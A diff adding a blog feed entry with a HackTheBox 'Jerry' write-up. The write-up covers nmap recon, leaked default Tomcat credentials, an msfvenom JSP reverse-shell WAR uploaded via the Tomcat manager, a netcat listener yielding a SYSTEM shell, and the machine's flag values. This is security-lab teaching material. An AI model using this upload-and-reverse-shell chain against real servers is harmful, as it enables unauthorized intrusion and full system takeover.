@@ -12,6 +12,188 @@
     </author>
     
       <item>
+        <title>Jerry - HackTheBox</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;This going to be our last write-up of the year. In that manner, we are going to be tackling the Jerry box in &lt;a href=&quot;https://app.hackthebox.com&quot;&gt;HackTheBox&lt;/a&gt;. From the machine picture, it seems to be a Windows machine. Let’s get started!&lt;/p&gt;
+
+&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
+
+&lt;p&gt;We can take a look at the machine description. Let’s take a look:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Description&lt;/p&gt;
+
+  &lt;p&gt;Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ok! So the machine given to us is running Apacha Tomcat with weak credentials.&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
+
+&lt;p&gt;As always, let’s keep our mindset:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Understanding basic concepts&lt;/li&gt;
+  &lt;li&gt;Understanding the problem&lt;/li&gt;
+  &lt;li&gt;Crafting an attack&lt;/li&gt;
+  &lt;li&gt;Solving&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;However, it is worth noting that for an actual realistic penetration testing, we might adjust some of our steps. We shall call the first step “Recon”, since it is where we are going to be performing our reconnaissance.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;
+
+&lt;p&gt;Similar to understanding basic concepts, the recon part aims to help us gather information on our target by analyzing what we have on our disposal. For a black box pentest, this is the position we are right now. We first need intel on our target: which ports are open? can we investigate every service available? is there a web service (though this is already answered by the CTF description).&lt;/p&gt;
+
+&lt;p&gt;We shall start our recon with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;. I like to start my mapping the network with a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
+Starting Nmap 7.94 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-12-31 12:29 UTC
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.95
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 999 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;19.35 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, there is a webservice running on port 8080. Let’s run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; again, but now analyzing this port’s info. I’m also wondering if port 22 is open, but Windows’ firewall is blocking our pings. So, I ran:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22,8080 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;
+Starting Nmap 7.94 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-12-31 12:31 UTC
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.95
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.29s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT     STATE    SERVICE VERSION
+22/tcp   filtered ssh
+8080/tcp open     http    Apache Tomcat/Coyote JSP engine 1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;19.72 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Alright. We got our Apache Tomcat right there. Port 22 seems to be filtered, which might indicate a firewall behind it. Let’s access the web service at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://$IP:8080&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-1.png&quot; alt=&quot;tomcat homepage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems we are hacking someone who just installed Apache Tomcat version 7.0.88 on this machine. First thing that glances my eyes is the “Server Status” button. Let’s access it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-2.png&quot; alt=&quot;tomcat server status&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We get a bunch of nice information here. First, we can see that we are running on a Windows Server 2012 R2 on an amd64 architecture. We also can see that the hostname is “JERRY”. Since there is nothing much else here, we can continue our recon through the website manually. After some digging, we find the relative path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/docs/appdev/deployment.html&lt;/code&gt;, which leads to:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-3.png&quot; alt=&quot;tomcat deploy docs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This is interesting. It is telling us that to deploy an application in this version, we need to compress it into Web Archive (WAR) format.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A web application is defined as a hierarchy of directories and files in a standard layout. Such a hierarchy can be accessed in its “unpacked” form, where each directory and file exists in the filesystem separately, or in a “packed” form known as a Web ARchive, or WAR file. The former format is more useful during development, while the latter is used when you distribute your application to be installed.&lt;/p&gt;
+
+  &lt;p&gt;To facilitate creation of a Web Application Archive file in the required format, it is convenient to arrange the “executable” files of your web application (that is, the files that Tomcat actually uses when executing your app) in the same organization as required by the WAR format itself.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Since apps can be deployed, we somehow might be able to see which ones are running or have already deployed in this machine. While looking for it, I stumbled upon a login-style alert box, when trying to access the “Host manager”. Since I did not know any credentials, I simply clicked cancel on it, and then, as an error, the server lead me here:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-5.png&quot; alt=&quot;tomcat credential leak&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we have found a pair of credentials that might be the ones needed to access the “Host Manager”. The credentials are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tomcat:s3cret&lt;/code&gt;. Even though we have found them, trying to access the “Host manager” with them gives us a 403 response.&lt;/p&gt;
+
+&lt;p&gt;Upon some more investigation, we find this relative path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manager/html/list&lt;/code&gt;, which leads to this page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-4.png&quot; alt=&quot;tomcat deploy list&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems we are able to upload an app directly to the server from the web service. If this is the case, then we might be able to get a reverse shell by deploying an app.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;
+
+&lt;p&gt;Alright, it seems we have found our way in with our recon. Let’s take a look at what we have found so far:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Leaked credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tomcat:s3cret&lt;/code&gt; in error pages.&lt;/li&gt;
+  &lt;li&gt;Deployment app that accepts WAR files.&lt;/li&gt;
+  &lt;li&gt;An upload functionality within the web service.&lt;/li&gt;
+  &lt;li&gt;Unaccessible Host Manager page, giving 403.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Now, we might be able to think of an attack vector. We could investigate the unaccessible Host Manager page to see if we find more vectors. However, after some basic attempts, I’ve found nothing there. Which leads me to think our way in is through a reverse shell. If we manage to deploy a reverse shell app, we might be able to get foothold on the system.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
+
+&lt;p&gt;For that task, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt;. A simple Google Search “msfvenom war file” leads to &lt;a href=&quot;https://charlesreid1.com/wiki/MSFVenom&quot;&gt;this&lt;/a&gt; page. We can see that there is a specific payload for Tomcat. We can generate our payload with:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;YOUR IP&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1234 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; war &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.war
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.war&lt;/code&gt; file that is going to be our revserse shell app. After that, we upload this shell into the web server:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/tomcat-jerry-6.png&quot; alt=&quot;tomcat deploy list&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If successful, we are going to see a “OK” message right on the top of the page, underneath “Tomcat Web Application Manager”. Now, we need to start listening on port 1234 (or the port chosen as a payload to msfvenom) on our local machine with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 1234&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now, we simply access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/shell/&lt;/code&gt;, or the name of the app WAR file (without .war), and we shall get access to the machine through netcat:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 1234
+Connection from 10.10.10.95:49192
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.3.9600]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2013 Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;whoami
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We not only got access to the machine but also we are logged in as the Windows Administrator!&lt;/p&gt;
+
+&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
+
+&lt;p&gt;Now, we can just retrieve the flags. They are located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Administrator\Desktop\flags&lt;/code&gt; directory:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;lags&amp;gt;dir
+&lt;span class=&quot;nb&quot;&gt;dir
+ &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
+ Volume Serial Number is 0834-6C04
+
+ Directory of c:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;lags
+
+06/19/2018  06:09 AM    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+06/19/2018  06:09 AM    &amp;lt;DIR&amp;gt;          ..
+06/19/2018  06:11 AM                88 2 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the price of 1.txt
+               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             88 bytes
+               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   2,418,737,152 bytes free
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can easily retrieve them with the command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;lags&amp;gt;type &lt;span class=&quot;s2&quot;&gt;&quot;2 for the price of 1.txt&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;2 for the price of 1.txt&quot;&lt;/span&gt;
+user.txt
+7004dbcef0f854e0fb401875f26ebd00
+
+root.txt
+04a8b36e1545a455393d067e772fe90e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;In this CTF, we adopted a different approach, starting with thorough reconnaissance, and then gaining a foothold in the system. We exploited an Apache Tomcat file upload vulnerability, which provided us with a reverse shell as a Windows Administrator.&lt;/p&gt;
+
+&lt;p&gt;With a good recon, finding your way in became trivial in this CTF!&lt;/p&gt;
+
+&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sun, 31 Dec 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000//jerry-htb</link>
+        <link href="http://localhost:4000/jerry-htb"/>
+        <guid isPermaLink="true">http://localhost:4000/jerry-htb</guid>
+      </item>
+    
+      <item>
         <title>You know 0xDiablos? - HackTheBox</title>
         <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
 
